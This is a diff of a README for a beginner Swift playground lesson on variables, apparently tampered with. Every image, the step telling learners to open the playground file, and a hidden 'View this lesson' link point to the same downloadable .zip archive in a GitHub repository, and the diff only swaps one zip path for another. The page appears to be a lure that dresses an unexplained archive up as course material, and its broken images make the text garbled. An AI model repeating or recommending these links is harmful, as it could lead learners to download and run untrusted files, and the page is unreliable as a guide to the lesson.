@@ -1,7 +1,7 @@
 # Variables
 
-![Oscar Wilde](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
-> Be yourself; everyone else is already taken. -[Oscar Wilde](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![Oscar Wilde](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
+> Be yourself; everyone else is already taken. -[Oscar Wilde](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 ## Overview
 
@@ -27,23 +27,23 @@ After cloning down this project, you should locate the directory in Terminal or 
 
 Example of locating the directory in Finder:
 
-![dir](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![dir](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 Example of locating the directory in Terminal:
 
-![dir2](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![dir2](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
-Open up the `https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip` file. After doing so, you should see the following:
+Open up the `https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip` file. After doing so, you should see the following:
 
-![play](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![play](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 If you see something like this instead, then you need to make sure Render Documentation is checked.
 
-![instead](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![instead](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 You can check off the Render Documentation by opening up the Utilities pane (top right box thing) and then check it off like so:
 
-![checks](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![checks](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 Here's how you should be answering these various questions. We like to delete where it states
 
@@ -53,11 +53,11 @@ Here's how you should be answering these various questions. We like to delete wh
 
 Then replace that section with what you think the answer is.. like so:
 
-![answer](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![answer](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 What exactly is a Playground file? A *playground* is an interactive Swift coding environment that evaluates each statement and displays results as updates are made, without the need to create project. Here's an example:
 
-![play](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![play](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 Notice how in the right pane, the playground file is able to compile and run this code *while* I'm typing it in. That's awesome and makes it a really great tool to learn how to code. As you move forward in your "learning how to program" career, if you're ever challenged with a topic or want to brush up on some material, create your own *playground* by launching Xcode and just start writing some code!
 
@@ -66,10 +66,10 @@ Now.. move forward and complete this lab! After you're done, make sure you save 
 
 Good luck.
 
-![luck](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip)
+![luck](https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip)
 
 
 
 
 
-<a href='https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip' data-visibility='hidden'>View this lesson on https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/Task-first-intro-swift-playground-prestomial.zip</a>
+<a href='https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip' data-visibility='hidden'>View this lesson on https://github.com/iamreal2/swift-firstTask-playground-swift-intro-000/raw/refs/heads/master/MyPlayground.playground/Pages/main.xcplaygroundpage/swift-playground-first-intro-Task-1.2.zip</a>
